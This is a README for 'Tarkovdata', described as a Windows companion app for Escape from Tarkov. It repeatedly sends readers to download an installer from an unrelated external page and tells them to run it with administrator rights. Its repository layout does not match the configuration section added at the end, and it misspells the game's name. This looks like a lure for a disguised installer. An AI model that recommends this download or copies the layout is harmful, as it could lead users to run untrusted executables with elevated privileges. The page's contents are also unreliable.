# Tarkovdata – Your Windows‑only Escape from Tarkov Companion

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-0891b2?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-architecture--modules"><img src="https://img.shields.io/badge/RUNTIME-SPECS-d97706?style=for-the-badge&logo=code&logoColor=white&labelColor=161b22" alt="RUNTIME"></a> <a href="#-workflows--usage"><img src="https://img.shields.io/badge/WORKFLOW-GUIDE-0284c7?style=for-the-badge&logo=terminal&logoColor=white&labelColor=161b22" alt="WORKFLOW"></a>
  <br>
  <a href="#-frequently-asked-questions"><img src="https://img.shields.io/badge/FAQ-ANSWERS-2563eb?style=for-the-badge&logo=book&logoColor=white&labelColor=161b22" alt="FAQ"></a> <a href="#-overview"><img src="https://img.shields.io/badge/OVERVIEW-DOCS-4f46e5?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=161b22" alt="OVERVIEW"></a>
</div>

**Author:** *MidnightPilotPonder*
**Platform:** Windows 10 / 11 (desktop only)

---

## 📖 What is Tarkovdata?

Tarkovdata is a lightweight Windows desktop utility that brings the most essential **Escape from Tarek** information right to your fingertips:

| Feature | Description |
| ------- | ----------- |
| **Live Market Prices** | Pulls the latest flea‑market data and displays price trends for weapons, gear, and commodities. |
| **Loot Table Explorer** | Browse every map’s loot tables with filters for rarity, value, and container type. |
| **Player Stats Dashboard** | Import your profile JSON and view detailed kill/death ratios, raid outcomes, and progression charts. |
| **Quick‑Reference Overlay** | Optional always‑on‑top window for in‑game look‑ups without leaving the raid. |

All data is cached locally for instant access and refreshed automatically when you’re online.

---

## 🚀 Getting Started

1. **Download** the latest installer from the button below.
2. Run the Release (requires administrator rights the first time).
3. Launch **Tarkovdata** from your Start menu.
4. Follow the onboarding wizard to connect your Tarkov account (optional) and choose your preferred data sources.

> **Note:** The app is built exclusively for Windows 10 / 11. It will not run on other operating systems.

---

## 📂 Repository Structure

```
Tarkovdata/
├─ src/                # Core C# source files
├─ resources/          # UI assets (icons, fonts)
├─ docs/               # Documentation and changelog
├─ installer/          # Windows Installer project
└─ README.md           # (You are here)
```

---

## 🛠️ Development

If you want to contribute:

1. Fork the repo.
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).
3. Submit a pull request with a clear description and screenshots (if UI changes).

The project targets **.NET 6** and uses **WPF** for the interface.

---

## 📦 Download

<div style="text-align:center; margin: 20px 0;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#4A90E2;color:#fff;padding:12px 24px;border-radius:6px;font-weight:bold;text-decoration:none;display:inline-block;">
    Download Tarkovdata Installer
  </a>
</div>

---

## 📜 License

Tarkovdata is released under the **MIT License** – feel free to use, modify, and distribute it as you wish, provided the original copyright notice is retained.

---

## 🙏 Acknowledgements

- The Escape from Tarkov community for providing open data feeds.
- The .NET and WPF teams for a solid development platform.

---

**Happy raiding!** 🎯

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```